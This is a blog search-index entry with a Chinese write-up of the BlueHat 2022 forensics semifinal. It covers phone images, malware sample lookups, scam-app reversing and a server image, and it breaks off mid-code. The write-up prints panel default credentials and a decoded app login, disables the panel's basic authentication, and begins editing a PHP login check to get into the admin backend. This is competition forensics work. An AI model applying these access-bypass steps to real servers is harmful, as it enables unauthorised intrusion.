<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>BlueHat2022半决赛Writeup</title>
    <link href="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/"/>
    <url>/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1>BlueHat2022半决赛</h1><p><em>注：虚线代表没做出来/错误/存在问题的部分</em></p><h2 id="手机取证">手机取证</h2><h3 id="iPhone手机的iBoot固件版本号-（答案参考格式：iBoot-1-1-1）">iPhone手机的iBoot固件版本号:（答案参考格式：iBoot-1.1.1）</h3><p>盘古石手机取证导入受害者检材：</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911201128980.png" alt="image-20230911201128980"></p><p>得到<code>iBoot-7429.62.1</code></p><h3 id="该手机制作完备份UTC-8的时间（非提取时间）">该手机制作完备份UTC+8的时间（非提取时间）</h3><p>火眼证据导入苹果检材：</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911201421464.png" alt="image-20230911201421464"></p><p><code>2022-01-11 18:47:38</code></p><h2 id="exe分析">exe分析</h2><h3 id="文件services-exe创建可执行文件的路径是-（答案参考格式：C-Windows-exe）">文件services.exe创建可执行文件的路径是:（答案参考格式：C:\Windows .exe）</h3><p>从苹果镜像查看微信聊天记录，提取附件：</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911201529449.png" alt="image-20230911201529449"></p><p>上传微步：</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911201555339.png" alt="image-20230911201555339"></p><p>查看该MD5下的分析报告：</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911201652337.png" alt="image-20230911201652337"></p><p>第一个可执行文件建立在temp目录下，可知为临时文件，第二个可执行文件路径即为答案：<code>C:\Program Files\Common Files\Services\WmiApSvr.exe</code></p><h3 id="文件HackTool-FlyStudio-acz-unpack-exe是否调用了advapi32-dll动态函式链接库？">文件HackTool.FlyStudio.acz_unpack.exe是否调用了advapi32.dll动态函式链接库？</h3><p>同样找到该文件的MD5：</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911201827464.png" alt="image-20230911201827464"></p><p>查看导入表可知，调用了该链接库：</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911202146102.png" alt="image-20230911202146102"></p><h3 id="文件aspnet-wp-v-exe执行后的启动的进程是什么-（答案参考格式：qax-exe）">文件aspnet_wp.v.exe执行后的启动的进程是什么:（答案参考格式：qax.exe）</h3><p>找到该文件的md5：</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911202317001.png" alt="image-20230911202317001"></p><p>进入报告，看行为树：</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911202333172-1694435013781-4.png" alt="image-20230911202333172"></p><p>启动了<code>svchost.exe</code>。</p><h3 id="文件-4085034a23cccebefd374e4a77aea4f1-是什么类型的木马-（答案参考格式：勒索）">文件[4085034a23cccebefd374e4a77aea4f1]是什么类型的木马:（答案参考格式：勒索）</h3><p><code>挖矿</code>。微步或VT查询木马家族、威胁标签可以得到答案。</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911202843736.png" alt="image-20230911202843736"></p><h3 id="文件-4085034a23cccebefd374e4a77aea4f1-网络连接的IP地址的归属地是哪个国家-（答案参考格式：美国）">文件[4085034a23cccebefd374e4a77aea4f1]网络连接的IP地址的归属地是哪个国家:（答案参考格式：美国）</h3><p><em><code>法国</code></em>。</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911202925807.png" alt="image-20230911202925807"></p><h2 id="APK分析">APK分析</h2><h3 id="受害人手机中exec的序列号是-（答案参考格式：0xadc）">受害人手机中exec的序列号是:（答案参考格式：0xadc）</h3><p>把受害者手机镜像放到闪电模拟器VMS目录打开，提取exec安装包。</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911203019766.png" alt="image-20230911203019766"></p><p>放到雷电APP智能分析：</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911203249198.png" alt="image-20230911203249198"></p><p><code>0x936eacbe07f201df</code></p><h3 id="受害人手机中exec关联服务器地址是-（答案参考格式：asd-as-d）">受害人手机中exec关联服务器地址是:（答案参考格式：asd.as.d）</h3><p>启动动态监控功能，可以看到应用存在访问连接：</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911203626222.png" alt="image-20230911203626222"></p><p>打开后可以看到可疑服务器地址：</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911203649112-1694435810021-6.png" alt="image-20230911203649112"></p><p><code>ansjk.ecxeio.xyz</code></p><h3 id="受害人手机中exec加载服务器的函数是-（答案参考格式：asda）">受害人手机中exec加载服务器的函数是:（答案参考格式：asda）</h3><p>使用jadx-gui分析该APK，在<code>minmtta.hemjcbm.ahibyws.MainActivity</code>中发现疑似base64字符串<code>aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6</code></p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911203756381.png" alt="image-20230911203756381"></p><p>解密后为<code>https://ansjk.ecxeio.xyz</code>，即上题抓取的可疑地址。</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911203917079.png" alt="image-20230911203917079"></p><p>故加载服务器的函数为<code>t</code>。</p><h3 id="受害人手机中exec的打包ID是-（答案参考格式：adb-adb-cn）">受害人手机中exec的打包ID是:（答案参考格式：<a href="http://adb.adb.cn">adb.adb.cn</a>）</h3><p><code> exec.azj.kny.d.c</code></p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911204015741.png" alt="image-20230911204015741"></p><h3 id="受害人手机中exec的是否有安全检测行为？">受害人手机中exec的是否有安全检测行为？</h3><p>在<code>d.a.a.h</code>路径下，可以看到存在检测root的安全检测功能：</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911204133270.png" alt="image-20230911204133270"></p><h3 id="受害人手机中exec的检测方法的完整路径和方法名是-（答案参考格式：a-a-a-）">受害人手机中exec的检测方法的完整路径和方法名是:（答案参考格式：a.a.a()）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (d.a.a.c.a.b() / <span class="hljs-number">1048576</span> &lt; <span class="hljs-number">200</span>) &#123;<br>    C.b(<span class="hljs-string">&quot;您的储存空间不足，可能会影响您正常使用&quot;</span>, <span class="hljs-number">1</span>);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (d.a.a.c.a.a()) &#123;<br>    C.b(<span class="hljs-string">&quot;您手机处于root环境，请注意资金安全&quot;</span>, <span class="hljs-number">1</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (d.a.a.c.a.a(<span class="hljs-built_in">this</span>)) &#123;<br>        C.b(<span class="hljs-string">&quot;当前设备不受信任，请注意资金安全&quot;</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>根据代码判断，<code>d.a.a.c.a.a</code>为检测方法。</p><h3 id="受害人手机中exec有几个界面-（答案参考格式：2）">受害人手机中exec有几个界面:（答案参考格式：2）</h3><p><em>打开AndroidManifest.xml文件，可以找到 <activity> 标签，每个标签对应一个界面。通过统计这些标签，你可以获得应用程序包含的界面数量。即为<code>3</code>（最后两个是同一个）。</activity></em></p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911204235035.png" alt="image-20230911204235035"></p><h3 id="受害人手机中红星IPA的包名是-（答案参考格式：a-s-d）">受害人手机中红星IPA的包名是:（答案参考格式：a.s.d）</h3><p><em>受害人手机，如下路径可以找到ipa：</em>(其他人的wp可以从受害人的vmdk镜像里找到，但是我的镜像里找不到下图的路径，很疑惑)</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911214222286.png" alt="image-20230911214222286"></p><p>提取ipa，没合适分析工具，直接当zip包解压。</p><p>参考文章:<a href="https://blog.didctf.com/index.php/archives/378/">https://blog.didctf.com/index.php/archives/378/</a><br>根据参考文章知道包名是<code>CFBundleIdentifier</code>，所以直接搜索得到答案：</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911215745255.png" alt="image-20230911215745255"></p><p><code>com.dd666.hongxin</code></p><h3 id="受害人手机中红星IPA的APIKEY是-（答案参考格式：asd）">受害人手机中红星IPA的APIKEY是:（答案参考格式：asd）</h3><p><em>全局查找<code>apikey</code>：</em></p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911215554263.png" alt="image-20230911215554263"></p><p><code>d395159c291c627c9d4ff9139bf8f0a700b98732</code></p><h3 id="受害人手机中红星IPA的权限有哪些？">受害人手机中红星IPA的权限有哪些？</h3><p>查看该文件可以得到答案：麦克风、定位、地理位置、摄像头</p><h3 id="嫌疑人手机中红星APK的服务器地址是-（答案参考格式：ass-a-d-11）">嫌疑人手机中红星APK的服务器地址是:（答案参考格式：ass.a.d:11）</h3><p>将应用安装到虚拟机，打开后发现连接的服务器与端口：</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911205621715.png" alt="image-20230911205621715"></p><p><code>www.nansjy.com.cn:8161</code></p><h3 id="嫌疑人手机中红星APK的程序入口是-（答案参考格式：a-v-b-n）">嫌疑人手机中红星APK的程序入口是:（答案参考格式：a.v.b.n）</h3><p>从微信记录中导出红星apk：</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911205021550.png" alt="image-20230911205021550"></p><p>找到程序入口：<code>com.example.weisitas526sad.activity.SplashActivity</code></p><h3 id="嫌疑人手机中分析聊天工具，服务器的登录端口是-（答案参考格式：12）">嫌疑人手机中分析聊天工具，服务器的登录端口是:（答案参考格式：12）</h3><p><code>6661</code></p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911210219640.png" alt="image-20230911210219640"></p><h3 id="嫌疑人手机中分析聊天工具，用户归属的机构是-（答案参考格式：太阳）">嫌疑人手机中分析聊天工具，用户归属的机构是:（答案参考格式：太阳）</h3><p><em><code>红星</code></em></p><h3 id="结合手机流量分析聊天工具的登录账号和密码是-（答案参考格式：1212311-12312asd）">结合手机流量分析聊天工具的登录账号和密码是:（答案参考格式：1212311/12312asd）</h3><p>检材中的流量文件为<code>saz</code>格式，查询得到为fiddler的流量文件。使用该程序打开：</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911204759759.png" alt="image-20230911204759759"></p><p>抓取到<code>POST /vsf2f/vsf2fv2/token</code>请求中提交的用户名密码，其中md5<code>7f07965ec20841305f9e53a7a89584f4</code>需要通过somd5解密：</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230911204900310.png" alt="image-20230911204900310"></p><p><code>17317289056/b12345678b</code></p><h2 id="服务器取证">服务器取证</h2><h3 id="服务器在启动时设置了运行时间同步脚本，请写出脚本内第二行内容。（答案参考格式：-abcd-tmp-www-windows-com）">服务器在启动时设置了运行时间同步脚本，请写出脚本内第二行内容。（答案参考格式：/abcd/tmp <a href="http://www.windows.com">www.windows.com</a>）</h3><p>centos服务器的<code>/etc/rc.d/rc.local</code>路径标记了启动时所运行的脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sh">[root@yisu-60a2196bb5a4f rc.d]<span class="hljs-comment"># cat rc.local</span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-comment"># THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># It is highly advisable to create own systemd services or udev rules</span><br><span class="hljs-comment"># to run scripts during boot instead of using this file.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># In contrast to previous versions due to parallel execution during boot</span><br><span class="hljs-comment"># this script will NOT be run after all other services.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Please note that you must run &#x27;chmod +x /etc/rc.d/rc.local&#x27; to ensure</span><br><span class="hljs-comment"># that this script will be executed during boot.</span><br>/bin/sh /root/time.sh<br><span class="hljs-built_in">touch</span> /var/lock/subsys/local<br></code></pre></td></tr></table></figure><p>可以看到时间同步脚本为<code>/root/time.sh</code>，故其第二行内容为：<code>skip=44</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs sh">[root@yisu-60a2196bb5a4f rc.d]<span class="hljs-comment"># cat /root/time.sh</span><br><span class="hljs-comment">#!/bin/sh</span><br>skip=44<br><br>tab=<span class="hljs-string">&#x27;   &#x27;</span><br><span class="hljs-built_in">nl</span>=<span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#x27;</span><br>IFS=<span class="hljs-string">&quot; $tab<span class="hljs-variable">$nl</span>&quot;</span><br><br><span class="hljs-built_in">umask</span>=`<span class="hljs-built_in">umask</span>`<br><span class="hljs-built_in">umask</span> 77<br><br>gztmpdir=<br><span class="hljs-built_in">trap</span> <span class="hljs-string">&#x27;res=$?</span><br><span class="hljs-string">  test -n &quot;$gztmpdir&quot; &amp;&amp; rm -fr &quot;$gztmpdir&quot;</span><br><span class="hljs-string">  (exit $res); exit $res</span><br><span class="hljs-string">&#x27;</span> 0 1 2 3 5 10 13 15<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> <span class="hljs-built_in">mktemp</span> &gt;/dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span><br>  gztmpdir=`<span class="hljs-built_in">mktemp</span> -dt`<br><span class="hljs-keyword">else</span><br>  gztmpdir=/tmp/gztmp$$; <span class="hljs-built_in">mkdir</span> <span class="hljs-variable">$gztmpdir</span><br><span class="hljs-keyword">fi</span> || &#123; (<span class="hljs-built_in">exit</span> 127); <span class="hljs-built_in">exit</span> 127; &#125;<br><br>gztmp=<span class="hljs-variable">$gztmpdir</span>/<span class="hljs-variable">$0</span><br><span class="hljs-keyword">case</span> <span class="hljs-variable">$0</span> <span class="hljs-keyword">in</span><br>-* | */*<span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#x27;</span>) <span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">&quot;<span class="hljs-variable">$gztmp</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">rm</span> -r <span class="hljs-string">&quot;<span class="hljs-variable">$gztmp</span>&quot;</span>;;<br>*/*) gztmp=<span class="hljs-variable">$gztmpdir</span>/`<span class="hljs-built_in">basename</span> <span class="hljs-string">&quot;<span class="hljs-variable">$0</span>&quot;</span>`;;<br><span class="hljs-keyword">esac</span> || &#123; (<span class="hljs-built_in">exit</span> 127); <span class="hljs-built_in">exit</span> 127; &#125;<br><br><span class="hljs-keyword">case</span> `<span class="hljs-built_in">echo</span> X | <span class="hljs-built_in">tail</span> -n +1 2&gt;/dev/null` <span class="hljs-keyword">in</span><br>X) tail_n=-n;;<br>*) tail_n=;;<br><span class="hljs-keyword">esac</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">tail</span> <span class="hljs-variable">$tail_n</span> +<span class="hljs-variable">$skip</span> &lt;<span class="hljs-string">&quot;<span class="hljs-variable">$0</span>&quot;</span> | gzip -<span class="hljs-built_in">cd</span> &gt; <span class="hljs-string">&quot;<span class="hljs-variable">$gztmp</span>&quot;</span>; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">umask</span> <span class="hljs-variable">$umask</span><br>  <span class="hljs-built_in">chmod</span> 700 <span class="hljs-string">&quot;<span class="hljs-variable">$gztmp</span>&quot;</span><br>  (<span class="hljs-built_in">sleep</span> 5; <span class="hljs-built_in">rm</span> -fr <span class="hljs-string">&quot;<span class="hljs-variable">$gztmpdir</span>&quot;</span>) 2&gt;/dev/null &amp;<br>  <span class="hljs-string">&quot;<span class="hljs-variable">$gztmp</span>&quot;</span> <span class="hljs-variable">$&#123;1+&quot;$@&quot;&#125;</span>; res=$?<br><span class="hljs-keyword">else</span><br>  <span class="hljs-built_in">echo</span> &gt;&amp;2 <span class="hljs-string">&quot;Cannot decompress <span class="hljs-variable">$0</span>&quot;</span><br>  (<span class="hljs-built_in">exit</span> 127); res=127<br><span class="hljs-keyword">fi</span>; <span class="hljs-built_in">exit</span> <span class="hljs-variable">$res</span><br>���1time.shSV�O���/���/-.�/q�J<br>RKRJ2sS��2�K���˸��Ӆ*<br></code></pre></td></tr></table></figure><p><em>但是文件结尾存在乱码，查看其他人wp后发现是gzexe加密。<strong>使用gzexe加密的shell脚本代码特征为：前面一段代码是正常的命令字符，到了后面某一行开始就全部为乱码。</strong></em></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">[root@yisu-60a2196bb5a4f ~]<span class="hljs-comment"># ls</span><br>anaconda-ks.cfg  backup.sh.x  db-bak  install.sh  mysqldump.sql  time.sh  time.sh~<br>[root@yisu-60a2196bb5a4f ~]<span class="hljs-comment"># cat time.sh</span><br><span class="hljs-comment">#!/bin/sh</span><br>/usr/sbin/ntpdate time.nist.gov<br></code></pre></td></tr></table></figure><p>答案为：<code>/usr/sbin/ntpdate time.nist.gov</code></p><h3 id="服务器在计划任务添加了备份数据库脚本，请写出该脚本的第二行内容。（答案参考格式：2022年第六届蓝帽杯）">服务器在计划任务添加了备份数据库脚本，请写出该脚本的第二行内容。（答案参考格式：2022年第六届蓝帽杯）</h3><p>通过<code>crontab -l</code>可以查看到计划任务：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">[root@yisu-60a2196bb5a4f rc.d]<span class="hljs-comment"># crontab -l</span><br>00 03 * * * /root/backup.sh.x<br></code></pre></td></tr></table></figure><p>打开文件发现是乱码，应该还是混淆，但是没搜到什么混淆……</p><p><em>查了资料发现是SHC混淆（<a href="https://blog.csdn.net/qq_39626154/article/details/86629742">shc/unshc工具用于加/解密shell脚本_草莓甜甜圈的博客-CSDN博客</a>）</em>：</p><p>Shc可以用来对shell脚本进行加密，可以将shell脚本转换为一个可执行的二进制文件。经过shc对shell脚本进行加密后，会同时生成两种个新的文件，一个是加密后的可执行的二进制文件（文件名以.x结束），另一个是C语言的原文件（文件名以.x.c结束）。</p><p>解密后得到答案：</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230912115118825.png" alt="image-20230912115118825"></p><h3 id="使用宝塔linux面板的密码加密方式对字符串lanmaobei进行加密，写出加密结果。（答案参考格式：e10adc3949ba59abbe56e057f20f883e）">使用宝塔linux面板的密码加密方式对字符串lanmaobei进行加密，写出加密结果。（答案参考格式：e10adc3949ba59abbe56e057f20f883e）</h3><p>加密文件路径：<code>/www/server/panel/class/users.py</code></p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230912154656770.png" alt="image-20230912154656770"></p><p><em>加密过程就是初始密码进行md5加密运算后，结果尾部加上<code>_bt.cn</code>再进行一次md5运算，然后与盐加上再进行md5加密。但是官方wp里没有和盐加密运算。</em></p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230912160118379.png" alt="image-20230912160118379"></p><h3 id="写出服务器中第一次登录宝塔面板的时间。（答案参考格式：2022-02-02-02-02-02）">写出服务器中第一次登录宝塔面板的时间。（答案参考格式：2022-02-02 02:02:02）</h3><p>服务器终端输入<code>bt 14</code>查看宝塔面板端口：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sh">[root@yisu-60a2196bb5a4f config]<span class="hljs-comment"># bt</span><br>===============宝塔面板命令行==================<br>(1) 重启面板服务           (8) 改面板端口<br>(2) 停止面板服务           (9) 清除面板缓存<br>(3) 启动面板服务           (10) 清除登录限制<br>(4) 重载面板服务           (11) 取消入口限制<br>(5) 修改面板密码           (12) 取消域名绑定限制<br>(6) 修改面板用户名         (13) 取消IP访问限制<br>(7) 强制修改MySQL密码      (14) 查看面板默认信息<br>(22) 显示面板错误日志      (15) 清理系统垃圾<br>(23) 关闭BasicAuth认证     (16) 修复面板(检查错误并更新面板文件到最新版)<br>(24) 关闭谷歌认证          (17) 设置日志切割是否压缩<br>(25) 设置是否保存文件历史副本  (18) 设置是否自动备份面板<br>(0) 取消<br>===============================================<br>请输入命令编号：14<br>===============================================<br>正在执行(14)...<br>===============================================<br>==================================================================<br>BT-Panel default info!<br>==================================================================<br>外网面板地址: http://www.nansjy.com.cn:8517/c0a27351<br>内网面板地址: http://192.168.78.132:8517/c0a27351<br>*以下仅为初始默认账户密码，若无法登录请执行bt命令重置账户/密码登录<br>username: d0qxqo4a<br>password: e65972dd<br>If you cannot access the panel,<br>release the following panel port [8517] <span class="hljs-keyword">in</span> the security group<br>若无法访问面板，请检查防火墙/安全组是否有放行面板[8517]端口<br>==================================================================<br></code></pre></td></tr></table></figure><p>登录面板提示没有访问权限，按照说明删除文件：</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230912102815288.png" alt="image-20230912102815288"></p><p>再次打开该网页路径后发现存在basic认证，从<code>/www/server/panel/config/basic_auth.json</code>获取到账号密码，解密后为：<code>root_bt.cn / root123456_bt.cn</code>，但是还没办法登录（<s>解密了个寂寞，回顾上题发现需要去掉后缀</s>）。直接<code>bt 23</code>关闭基础认证，可以看到登录页面。</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230912103132551.png" alt="image-20230912103132551"></p><p>通过默认账号密码可以直接登录进后台。在后台查看日志发现并没有登录记录，又折回去从服务器中寻找：<code>/www/server/panel/logs/request</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">[root@yisu-60a2196bb5a4f class]<span class="hljs-comment"># cd /www/server/panel/logs/</span><br>[root@yisu-60a2196bb5a4f logs]<span class="hljs-comment"># ls</span><br>access.log  certbot.log  error.log  panel.pid  request  task.log  task.pid  terminal.log<br>[root@yisu-60a2196bb5a4f logs]<span class="hljs-comment"># cat access.log</span><br>[root@yisu-60a2196bb5a4f logs]<span class="hljs-comment"># cat request/202</span><br>2021-05-17.json.gz  2021-05-26.json.gz  2021-06-05.json.gz  2021-06-19.json.gz  2023-09-12.json<br>2021-05-20.json.gz  2021-05-27.json.gz  2021-06-07.json.gz  2021-07-03.json.gz<br></code></pre></td></tr></table></figure><p>发现备份的文件为gz，使用gzip进行解包：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">[root@yisu-60a2196bb5a4f request]<span class="hljs-comment"># gzip -dv 2021-05-17.json.gz</span><br>2021-05-17.json.gz:      93.4% -- replaced with 2021-05-17.json<br>[root@yisu-60a2196bb5a4f request]<span class="hljs-comment"># ls</span><br>2021-05-17.json     2021-05-26.json.gz  2021-06-05.json.gz  2021-06-19.json.gz  2023-09-12.json<br>2021-05-20.json.gz  2021-05-27.json.gz  2021-06-07.json.gz  2021-07-03.json.gz<br></code></pre></td></tr></table></figure><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230912161848398.png" alt="image-20230912161848398"></p><p><code>2021-05-17 16:10:40</code></p><h3 id="写出宝塔面板的软件商店中已安装软件的个数（答案参考格式：2）">写出宝塔面板的软件商店中已安装软件的个数（答案参考格式：2）</h3><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230912110601095.png" alt="image-20230912110601095"></p><p><code>6</code></p><h3 id="写出涉案网站（维斯塔斯）的运行目录路径。（答案参考格式：-root-etc-sssh-html）">写出涉案网站（维斯塔斯）的运行目录路径。（答案参考格式：/root/etc/sssh/html）</h3><p><code>/www/wwwroot/v9.licai.com/public</code></p><h3 id="写出最早访问涉案网站后台的IP地址。（答案参考格式：111-111-111-111）">写出最早访问涉案网站后台的IP地址。（答案参考格式：111.111.111.111）</h3><p><code>183.160.76.194</code></p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230912110623536.png" alt="image-20230912110623536"></p><h3 id="写出涉案网站（维斯塔斯）的“系统版本”号。（答案参考格式：6-6-6666）">写出涉案网站（维斯塔斯）的“系统版本”号。（答案参考格式：6.6.6666）</h3><p>通过分析<code>/www/wwwlogs/v9.licai.com.log</code>，看到一个后台可疑的路径：<code>/AdminV9YY/</code>：</p><p><img src="/2023/09/12/BlueHat2022%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20230912170542369.png" alt="image-20230912170542369"></p><p><em>但是直接访问错误，怀疑后面有跟login或其他关键字：</em></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.78.1</span> - - <span class="hljs-string">[13/Sep/2023:00:12:39 +0800]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /AdminV9YY/Login HTTP/1.1&quot;</span> <span class="hljs-number">200</span> <span class="hljs-number">1423</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.76&quot;</span><br></code></pre></td></tr></table></figure><p>用phpmyadmin里的账号密码无法登录，应该是有加密函数，这里直接搜索登录文件修改：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-number">0</span>) &#123;<br><br>    <span class="hljs-variable">$msg</span> = <span 